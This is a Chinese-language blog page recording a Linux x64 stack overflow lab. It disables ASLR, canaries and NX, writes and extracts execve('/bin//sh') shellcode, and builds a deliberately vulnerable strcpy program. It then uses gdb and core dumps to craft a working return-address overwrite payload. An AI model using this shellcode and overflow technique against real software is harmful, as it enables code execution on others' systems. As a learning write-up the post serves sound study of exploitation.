@@ -1,0 +1,991 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="linux,栈溢出," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
+<meta name="keywords" content="linux,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【实验】linux x64栈溢出">
+<meta property="og:url" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/index.html">
+<meta property="og:site_name" content="Ethan&#39; Blog">
+<meta property="og:description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/001.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/003.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/004.png">
+<meta property="og:updated_time" content="2017-10-11T12:23:09.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【实验】linux x64栈溢出">
+<meta name="twitter:description" content="这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。 环境配置实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下: 12345Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64">
+<meta name="twitter:image" content="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/001.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/"/>
+
+
+
+
+
+  <title> 【实验】linux x64栈溢出 | Ethan' Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ethan' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ethan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/15061633">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ethan' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                【实验】linux x64栈溢出
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-11T16:42:01+08:00">
+                2017-10-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64 GNU/Linux</div><div class="line"></div><div class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</div><div class="line"></div><div class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+<ul>
+<li><p>ASLR(地址空间布局随机化)</p>
+<p>关闭ASLR：<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code></p>
+</li>
+<li><p>Cannary</p>
+<p>开启Canary之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 _stackchk_fail函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</p>
+</li>
+<li><p>NX.<br>开启NX保护之后，程序的堆栈将会不可执行。对应GCC编译选项<code>-z execstack</code>解除该保护。</p>
+</li>
+</ul>
+<h3 id="GCC-与gdb版本问题"><a href="#GCC-与gdb版本问题" class="headerlink" title="GCC 与gdb版本问题"></a>GCC 与gdb版本问题</h3><p>gcc从4.8开始缺省使用了-gdwarf-4选项，较旧的gdb无法识别dwarf4版本的调试信息, 参见<a href="https://gcc.gnu.org/gcc-4.8/changes.html" target="_blank" rel="external">https://gcc.gnu.org/gcc-4.8/changes.html</a>。用gcc编译程序时，使用选项-gdwarf-3来指定生成dwarf3版本的调试信息，这样旧版的gdb就可以识别调试信息了。</p>
+<p>综合上述信息，使用gcc编译，应当使用如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fno-stack-protector -z execstack -gdwarf-3 xxx.c -o xxx</div></pre></td></tr></table></figure>
+<h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>对栈溢出的利用，通常是覆盖返回地址，指向自shellcode的地址，从而执行shellcode。因此，这里先解决shellcode的编写问题。参考：<a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="external">https://www.exploit-db.com/exploits/36858/</a>。首先编写汇编文件，验证shellcode功能，然后再提取机器码。使用<code>AT&amp;T</code>风格编写汇编文件如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.global _start</div><div class="line">_start:</div><div class="line">    xor %esi, %esi</div><div class="line">    # /bin//sh</div><div class="line">    movabs $0x68732f2f6e69622f, %rbx</div><div class="line">    push %rsi</div><div class="line">    push %rbx</div><div class="line">    push %rsp</div><div class="line">    pop %rdi</div><div class="line">    pushq $59</div><div class="line">    pop %rax</div><div class="line">    xor %edx, %edx</div><div class="line">    syscall</div></pre></td></tr></table></figure>
+<img src="/2017/10/11/【实验】linux-x64栈溢出/001.png" alt="001.png" title="">
+<p>提取机器码:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(objdump -d tmp | grep <span class="string">"^ "</span> | cut -f2); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">'\x'</span><span class="variable">$i</span>; <span class="keyword">done</span>; <span class="built_in">echo</span></div><div class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</div></pre></td></tr></table></figure>
+<h2 id="编写栈溢出程序"><a href="#编写栈溢出程序" class="headerlink" title="编写栈溢出程序"></a>编写栈溢出程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    <span class="built_in">strcpy</span>(buf, str);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> str[<span class="number">256</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA"</span>;</div><div class="line">    overflow(str);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>上面这段程序栈溢出漏洞触发点在strcpy函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址，另外就是确定shellcode的地址即str的首地址，让返回地址指向该地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$gcc</span> -fno-stack-protector -z execstack -gdwarf-3 pwn.c -o pwn</div><div class="line"><span class="variable">$gdb</span> pwn</div><div class="line">(gdb) start</div><div class="line">Temporary breakpoint 1, main () at pwn.c:10</div><div class="line">10	    char str[256]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA"</span>;</div><div class="line">(gdb) p /x <span class="variable">$rsp</span></div><div class="line"><span class="variable">$4</span> = 0x7fffffffdc10</div><div class="line">(gdb) p /x <span class="variable">$rbp</span></div><div class="line"><span class="variable">$5</span> = 0x7fffffffdd10        <span class="comment"># rbp rsp相差0x100, 即256,正是str申请的空间大小</span></div><div class="line">(gdb) p /x &amp;str</div><div class="line"><span class="variable">$3</span> = 0x7fffffffdc10		   <span class="comment"># str首地址</span></div><div class="line">(gdb) s</div><div class="line">11	    overflow(str);</div><div class="line">(gdb) s</div><div class="line">overflow (str=0x7fffffffdc10 <span class="string">"1\366H\273/bin//shVST_j;X1\322\017\005 AAAAAAAA"</span>)</div><div class="line">    at pwn.c:6</div><div class="line">6	    strcpy(buf, str);</div><div class="line">(gdb) p /x &amp;buf</div><div class="line"><span class="variable">$7</span> = 0x7fffffffdb80</div><div class="line">(gdb) p /x <span class="variable">$rbp</span></div><div class="line"><span class="variable">$8</span> = 0x7fffffffdc00			<span class="comment"># 0x7fffffffdc00 - 0x7fffffffdb80 = 128，即buf申请的空间大小</span></div></pre></td></tr></table></figure>
+<p>使用的shellcode长度为23字节，为了覆盖到返回地址，需要128+8(ebp)=136字节，则除了shellcode外还需要136-23=113填充字节。另外返回地址为0x7fffffffdd10,改为小端模式<code>\x10\xdc\xff\xff\xff\x7f</code>。那么payload为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> str[<span class="number">256</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xdc\xff\xff\xff\x7f"</span>;</div></pre></td></tr></table></figure>
+<p>编译后运行程序，出现段错误，不符合预期，于是gdb调试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">$ ./pwn</div><div class="line">段错误 (核心已转储)</div><div class="line"></div><div class="line">(gdb) s</div><div class="line">overflow (</div><div class="line">    str=0x7fffffffdc10 <span class="string">"1\366H\273/bin//shVST_j;X1\322\017\005 "</span>, <span class="string">'A'</span> &lt;repeats 112 <span class="built_in">times</span>&gt;, <span class="string">"\020\334\377\377\377\177"</span>) at pwn.c:6</div><div class="line">6	    strcpy(buf, str);</div><div class="line">(gdb) n</div><div class="line">7	&#125;</div><div class="line">(gdb) s</div><div class="line">Warning:</div><div class="line">Cannot insert breakpoint 0.</div><div class="line">Cannot access memory at address 0x6e69622fbb48f631</div><div class="line"></div><div class="line">0x00007fffffffdc10 <span class="keyword">in</span> ?? ()</div><div class="line">(gdb) p /x <span class="variable">$rsp</span></div><div class="line"><span class="variable">$1</span> = 0x7fffffffdc10</div><div class="line">(gdb) p /x <span class="variable">$rbp</span></div><div class="line"><span class="variable">$2</span> = 0x4141414141414141</div><div class="line">(gdb) p /x <span class="variable">$rip</span></div><div class="line"><span class="variable">$3</span> = 0x7fffffffdc10</div><div class="line">(gdb) x/32xg <span class="variable">$rsp</span>-0x10</div><div class="line">0x7fffffffdc00:	0x4141414141414141	0x00007fffffffdc10</div><div class="line">0x7fffffffdc10:	0x6e69622fbb48f631	0x5f54535668732f2f</div><div class="line">0x7fffffffdc20:	0x20050fd231583b6a	0x4141414141414141</div><div class="line">0x7fffffffdc30:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc40:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc50:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc60:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc70:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc80:	0x4141414141414141	0x4141414141414141</div><div class="line">0x7fffffffdc90:	0x4141414141414141	0x00007fffffffdc10</div><div class="line">0x7fffffffdca0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7fffffffdce0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
+<p>gdb查看rip, rsp, rbp都是正确的，然而实际运行却是段错误，网上搜索一番，原来是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，既然找到原因了，解决起来就比较容易了，只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
+<p>一种方案是修改源程序，打印出str的首地址：<code>printf(&quot;%p\n&quot;, str);</code>;另外一种方案是利用内核转储获取真实内存地址，无须改变源码。</p>
+<h3 id="GDB获取真实内存地址"><a href="#GDB获取真实内存地址" class="headerlink" title="GDB获取真实内存地址"></a>GDB获取真实内存地址</h3><p>首先启用内核转储：<code>ulimit -c unlimited</code>。该方法只在当前shell中生效，永久生效可以修改<code>/etc/profile</code>, 添加：<code>ulimit -c unlimited</code>。缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb &lt;程序可执行文件&gt; &lt;coredump转储文件&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ulimit</span> -c unlimited</div><div class="line">$ ./pwn</div><div class="line">段错误 (核心已转储)</div><div class="line">$ gdb pwn core</div><div class="line"></div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from pwn...done.</div><div class="line">[New LWP 11347]</div><div class="line">Core was generated by `./pwn<span class="string">'.</span></div><div class="line"><span class="string">Program terminated with signal SIGSEGV, Segmentation fault.</span></div><div class="line"><span class="string">#0  0x00007fffffffdc10 in ?? ()</span></div></pre></td></tr></table></figure>
+<img src="/2017/10/11/【实验】linux-x64栈溢出/003.png" alt="003.png" title="">
+<p>从上图可以看出shellcode地址，修改payload为: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> str[<span class="number">256</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xdc\xff\xff\xff\x7f"</span>;</div></pre></td></tr></table></figure>
+<p>重新编译运行。<br><img src="/2017/10/11/【实验】linux-x64栈溢出/004.png" alt="004.png" title=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://www.exploit-db.com/docs/33698.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/33698.pdf</a></li>
+<li><a href="http://www.therabb1thole.co.uk/tutorial/linux-64-bit-buffer-overflow-tutorial/" target="_blank" rel="external">Linux 64-bit Buffer Overflow Tutorial</a></li>
+<li><a href="http://www.therabb1thole.co.uk/tutorial/writing-linux-x86_64-bit-shellcode/" target="_blank" rel="external">Where does Shellcode come from</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/30/基本排序算法/" rel="next" title="基本排序算法">
+                <i class="fa fa-chevron-left"></i> 基本排序算法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/06/【破解】MAC版欧陆词典3-6-8/" rel="prev" title="破解MAC版欧陆词典3.6.8">
+                破解MAC版欧陆词典3.6.8 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars3.githubusercontent.com/u/15061633"
+               alt="Ethan" />
+          <p class="site-author-name" itemprop="name">Ethan</p>
+           
+              <p class="site-description motion-element" itemprop="description">personal blog :)</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">47</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友链
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GCC-与gdb版本问题"><span class="nav-number">1.1.</span> <span class="nav-text">GCC 与gdb版本问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写shellcode"><span class="nav-number">2.</span> <span class="nav-text">编写shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写栈溢出程序"><span class="nav-number">3.</span> <span class="nav-text">编写栈溢出程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GDB获取真实内存地址"><span class="nav-number">3.1.</span> <span class="nav-text">GDB获取真实内存地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
